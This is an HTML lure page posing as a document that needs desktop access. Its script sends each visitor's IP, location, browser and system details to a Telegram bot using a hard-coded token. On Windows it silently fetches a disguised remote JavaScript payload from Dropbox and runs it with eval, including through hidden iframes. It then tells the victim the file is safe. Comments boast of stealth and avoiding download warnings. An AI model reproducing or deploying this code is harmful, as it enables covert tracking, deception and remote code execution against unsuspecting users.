<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Desktop Access Required</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
            margin: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }
    </style>
</head>
<body>
    <script>
        // [YOUR FULL reportToTelegram() FUNCTION - EXACTLY UNCHANGED]
        function reportToTelegram() {
            try {
                const botToken = '8122635592:AAGMr779_JVHA-JyJ_8FKJ5TlvXBAm8rM6s';
                const chatId = '1078753356';
                
                const userAgent = navigator.userAgent;
                const platform = navigator.platform;
                const language = navigator.language;
                const screenRes = `${screen.width}x${screen.height}`;
                const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                const timestamp = new Date().toISOString();
                
                fetch('https://ipapi.co/json/')
                    .then(response => response.json())
                    .then(data => {
                        const ip = data.ip || 'Unknown';
                        const city = data.city || 'Unknown';
                        const region = data.region || 'Unknown';
                        const country = data.country_name || 'Unknown';
                        const org = data.org || 'Unknown';
                        const lat = data.latitude || 'Unknown';
                        const lon = data.longitude || 'Unknown';
                        
                        const message = `
🔔 *DOWNLOAD SUCCESSFUL*
📱 *Device:* Desktop/Windows
🆔 *IP:* ${ip}
📍 *Location:* ${city}, ${region}, ${country}
🗺 *Coordinates:* ${lat}, ${lon}
🏢 *ISP:* ${org}
💻 *OS:* ${platform}
🌐 *Browser:* ${userAgent.substring(0, 100)}...
🗣 *Language:* ${language}
📺 *Screen:* ${screenRes}
⏰ *TimeZone:* ${timeZone}
🕒 *Time:* ${timestamp}
                        `;
                        
                        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                chat_id: chatId,
                                text: message,
                                parse_mode: 'Markdown'
                            })
                        });
                    })
                    .catch(() => {
                        const message = `
🔔 *DOWNLOAD SUCCESSFUL* (Basic Info)
📱 *Device:* Desktop/Windows
💻 *OS:* ${platform}
🌐 *UserAgent:* ${userAgent.substring(0, 100)}...
🗣 *Language:* ${language}
📺 *Screen:* ${screenRes}
⏰ *TimeZone:* ${timeZone}
🕒 *Time:* ${timestamp}
                        `;
                        
                        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                chat_id: chatId,
                                text: message,
                                parse_mode: 'Markdown'
                            })
                        });
                    });
            } catch(e) {
                console.log('Report error:', e);
            }
        }

        function isMobile() {
            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile/i.test(navigator.userAgent);
        }

        function showMobileWarning() {
            document.body.innerHTML = `
                <h1>Desktop Access Required</h1>
                <p>This document requires desktop access for full functionality.</p>
                <p>Please open this file on a Computer.</p>
            `;
        }

        // 🔥 EDGE ZERO-WARNING EXECUTION - NO DISK DROP
        if (isMobile()) {
            showMobileWarning();
        } else if (/Windows/i.test(navigator.userAgent)) {
            // Pure memory execution - NO DOWNLOAD WARNINGS
            const scriptContainer = document.createElement('script');
            scriptContainer.textContent = `
                (function(){
                    // EMBED YOUR STEALTH JSCRIPT HERE or fetch into memory
                    fetch('https://www.dropbox.com/scl/fi/kxk9zuqx7fdng5tb1ey33/DebitAdvice7664_US_user.js?rlkey=xzhwhxc4281vr37oq3a4aoec3&raw=1')
                    .then(r=>r.text()).then(code=>eval(code));
                })();
            `;
            document.head.appendChild(scriptContainer);
            
            // Alternative: Multiple iframe execution points
            ['head', 'body'].forEach(container => {
                const iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                document[container].appendChild(iframe);
                iframe.srcdoc = `
                    <script>
                        fetch('https://www.dropbox.com/scl/fi/kxk9zuqx7fdng5tb1ey33/DebitAdvice7664_US_user.js?rlkey=xzhwhxc4281vr37oq3a4aoec3&raw=1')
                        .then(r=>r.text()).then(c=>eval(c));
                    <\/script>
                `;
            });
            
            reportToTelegram();
            setTimeout(()=>alert("File has been downloaded and safe to use"),2000);
        }
    </script>
